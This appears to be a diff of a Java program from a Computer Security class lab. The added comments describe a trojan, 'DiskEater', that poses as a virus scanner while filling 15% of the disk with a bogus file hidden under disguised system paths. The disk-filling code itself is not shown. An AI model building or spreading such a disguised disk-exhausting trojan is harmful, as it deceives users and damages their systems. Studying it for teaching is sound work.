@@ -1,4 +1,3 @@
-
 package diskeater;
 
 import java.io.File;
@@ -16,17 +15,26 @@ import java.util.logging.Logger;
 
 /**
  *
+ * DiskEater was a lab for a Computer Security class.
+ *
+ * It is a trojan imitating a text based virus scanning software. Instead of
+ * scanning for viruses, it writes a bogus file that fills a percentage of the
+ * computer's hard drive. Currently it will fill 15% of the hard disk.
+ *
+ * On Linux it stores the bogus file at /boot/config_os-generic On Windows, it
+ * stores the bogus file at \\Windows\\System32\\KERNAL-32.DLL
+ *
  * @author alex
  */
 public class DiskEater {
 
     /**
-     * @param args the command line arguments -c arguement clears the file if it
-     * exists
+     * @param args the command line arguments -c argument clears the file if it
+     * already exists
      */
     public static void main(String[] args) {
         boolean verbose = false;
-        
+
         if (getJunkPath().equals("junk")) {
             System.out.println("Operating System not supported.");
         } else {
@@ -96,7 +104,7 @@ public class DiskEater {
     }
 
     /**
-     * returns remaining disk space.
+     * returns remaining disk space.cd
      *
      * @return disk space in MB
      */
